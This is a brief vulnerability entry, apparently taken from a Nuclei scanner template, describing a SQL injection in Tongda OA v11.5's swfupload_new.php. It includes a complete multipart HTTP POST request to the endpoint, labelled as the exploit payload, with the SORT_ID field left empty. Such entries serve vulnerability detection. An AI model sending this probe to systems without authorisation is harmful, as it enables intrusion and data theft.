# Vulnerability: Tongda OA v11.5 swfupload_new.php - SQL Injection
**Classification:** CWE-89
**Source:** Nuclei Template (`tongda-oa-swfupload-sqli.yaml`)

## Description
There is a SQL injection vulnerability in the swfupload_new.php file of Tongda OA v11.5. An attacker can obtain sensitive information of the server through the vulnerability.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /general/file_folder/swfupload_new.php HTTP/1.1
Host: {{Hostname}}
Content-Type: multipart/form-data; boundary=----------GFioQpMK0vv2
Accept-Encoding: gzip

------------GFioQpMK0vv2
Content-Disposition: form-data; name="ATTACHMENT_ID"

1
------------GFioQpMK0vv2
Content-Disposition: form-data; name="ATTACHMENT_NAME"

1
------------GFioQpMK0vv2
Content-Disposition: form-data; name="FILE_SORT"

2
------------GFioQpMK0vv2
Content-Disposition: form-data; name="SORT_ID"

------------GFioQpMK0vv2--
```

